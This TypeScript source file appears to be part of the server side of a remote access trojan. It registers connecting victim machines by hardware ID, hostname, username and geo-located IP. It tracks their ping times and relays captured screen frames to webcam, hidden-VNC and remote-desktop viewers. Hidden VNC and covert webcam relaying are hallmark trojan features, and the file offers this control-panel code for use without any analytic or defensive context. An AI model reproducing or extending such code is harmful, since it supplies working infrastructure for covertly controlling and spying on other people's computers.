import geoip from "geoip-lite";
import { encodeMessage, decodeMessage, WireMessage } from "./protocol";
import { Buffer } from "node:buffer";
import { ClientInfo } from "./types";
import {
  consumeThumbnailRequest,
  getThumbnail,
  generateThumbnail,
  setLatestFrame,
} from "./thumbnails";
import { upsertClientRow } from "./db";
import { metrics } from "./metrics";

const MAX_PING_RTT_MS = 15_000;

export function handleHello(
  info: ClientInfo,
  payload: WireMessage,
  ws: any,
  ip?: string,
) {
  if (ip) {
    info.ip = ip;
  }
  info.hwid = (payload as any).hwid as string | undefined;
  info.host = payload.host;
  info.os = payload.os;
  info.arch = payload.arch;
  info.version = payload.version;
  info.user = payload.user;
  info.monitors = payload.monitors;
  info.monitorInfo = (payload as any).monitorInfo || info.monitorInfo;
  const geo = ip ? geoip.lookup(ip) : undefined;
  const countryRaw =
    geo?.country || (payload as any).country || info.country || "ZZ";
  const country = /^[A-Z]{2}$/i.test(countryRaw)
    ? countryRaw.toUpperCase()
    : "ZZ";
  info.country = country;
  info.lastSeen = Date.now();
  info.online = true;

  upsertClientRow({
    id: info.id,
    hwid: info.hwid,
    role: info.role,
    ip: info.ip,
    host: info.host,
    os: info.os,
    arch: info.arch,
    version: info.version,
    user: info.user,
    monitors: info.monitors,
    country: info.country,
    lastSeen: info.lastSeen,
    online: 1,
  });

  sendPingRequest(info, ws, "hello");

}

export function handlePing(info: ClientInfo, payload: WireMessage, ws: any) {
  //console.log(`[ping] from client=${info.id} ts=${payload.ts ?? ""}`);
  info.lastSeen = Date.now();
  info.online = true;
  upsertClientRow({
    id: info.id,
    lastSeen: info.lastSeen,
    online: 1,
  });
  ws.send(encodeMessage({ type: "pong", ts: payload.ts || Date.now() }));
  sendPingRequest(info, ws, "client_ping");
}

export function sendPingRequest(info: ClientInfo, ws: any, reason: string) {
  const now = Date.now();
  if (
    info.lastPingNonce !== undefined &&
    info.lastPingSent &&
    now-info.lastPingSent < MAX_PING_RTT_MS
  ) {
    return;
  }
  const nonce = now + Math.floor(Math.random() * 1000);
  info.lastPingSent = now;
  info.lastPingNonce = nonce;
  //console.log(`[ping] send ping to client=${info.id} reason=${reason} nonce=${nonce}`);
  ws.send(encodeMessage({ type: "ping", ts: nonce }));
}

export function handlePong(info: ClientInfo, payload: WireMessage) {
  const tsRaw = (payload as any).ts;
  const ts = typeof tsRaw === "number" ? tsRaw : Number(tsRaw);
  if (!Number.isFinite(ts)) {
    return;
  }

  const now = Date.now();
  const maxRttMs = MAX_PING_RTT_MS;
  const expectedNonce = info.lastPingNonce;
  if (expectedNonce === undefined) {
    return;
  }
  if (ts !== expectedNonce) {
    return;
  }
  if (!info.lastPingSent) {
    return;
  }

  const rtt = now - info.lastPingSent;

  if (rtt >= 0 && rtt < maxRttMs) {
    info.lastSeen = Date.now();
    info.online = true;
    info.pingMs = rtt;
    upsertClientRow({
      id: info.id,
      pingMs: info.pingMs,
      lastSeen: info.lastSeen,
      online: 1,
    });

    metrics.recordPing(rtt);
    info.lastPingNonce = undefined;
  } else {
  }
}

export function handleFrame(info: ClientInfo, payload: any) {
  const bytes = payload.data as unknown as Uint8Array;
  const header = (payload as any).header;
  const allowedFormats = ["jpeg", "jpg", "webp"];
  const fmt = String(header?.format || "").toLowerCase();
  const safeFormat = allowedFormats.includes(fmt) ? fmt : "";

  metrics.recordBytesReceived(bytes.length);

  let sentToViewers = false;
  try {
    const globalAny: any = globalThis as any;
    if (header?.webcam) {
      if (globalAny.__webcamBroadcast) {
        sentToViewers = globalAny.__webcamBroadcast(info.id, bytes, header);
      }
      if (sentToViewers) {
        return;
      }
    } else if (header?.hvnc) {
      if (globalAny.__hvncBroadcast) {
        sentToViewers = globalAny.__hvncBroadcast(info.id, bytes, header);
      }
      if (sentToViewers) {
        return;
      }
    } else if (globalAny.__rdBroadcast) {
      sentToViewers = globalAny.__rdBroadcast(info.id, bytes, header);
      if (sentToViewers) {
        return;
      }
    }
  } catch {}

  if (safeFormat) {
    setLatestFrame(info.id, bytes, safeFormat);
    if (consumeThumbnailRequest(info.id) || !getThumbnail(info.id)) {
      generateThumbnail(info.id);
    }
    upsertClientRow({ id: info.id, lastSeen: Date.now(), online: 1 });
  }
}
